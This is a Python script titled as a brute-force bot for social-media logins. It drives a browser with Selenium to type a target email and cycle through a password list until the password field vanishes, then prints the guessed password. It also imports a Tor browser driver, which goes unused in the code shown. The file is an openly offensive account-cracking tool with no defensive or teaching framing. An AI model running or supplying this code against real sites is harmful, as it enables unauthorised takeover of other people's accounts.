"""
BRUTEFORCE BOT FOR ANY SOCIAL-MEDIA
@AUTHOR crypt0sploit
@DATE 1 Mar 2019
"""

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException, NoSuchWindowException
from selenium.common.exceptions import StaleElementReferenceException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions
from tbselenium.tbdriver import TorBrowserDriver
from selenium.webdriver.common.keys import Keys
import time

class bruteBot:

    def __init__(self, email, password, site, email_field, pass_field, threads):
        self.email = email
        self.password = password
        self.site = site
        self.email_field = email_field
        self.pass_field = pass_field
        self.threads = threads
        self.chrome_options = webdriver.ChromeOptions()
        self.chrome_options.add_argument("--no-sandbox")
        self.driver = webdriver.Chrome(chrome_options=self.chrome_options)

    def bruteforcer(self):
        driver = self.driver
        pass_found = False
        driver.get(self.site)

        time.sleep(2)
        email_box = driver.find_element(By.NAME, self.email_field)
        email_box.clear()
        email_box.send_keys(self.email)
        
        while not pass_found:
            for i in self.password:
                try:
                    password_box = driver.find_element(By.NAME, self.pass_field)
                    # password_box.clear()
                    password_box.send_keys(i)
                    email_box.send_keys(Keys.RETURN)
                    password_box.send_keys(Keys.CONTROL, "a", Keys.DELETE)
                    time.sleep(self.threads)
                    old = i
                    print(f"Trying - {i}")
                except NoSuchWindowException:
                    print("Window closed")
                    pass_found = True
                    driver.close()
                    break
                except NoSuchElementException:
                    pass_found = True
                    if pass_found == True:
                        print(f'Password is >> {old} ')
                        driver.close()
                        break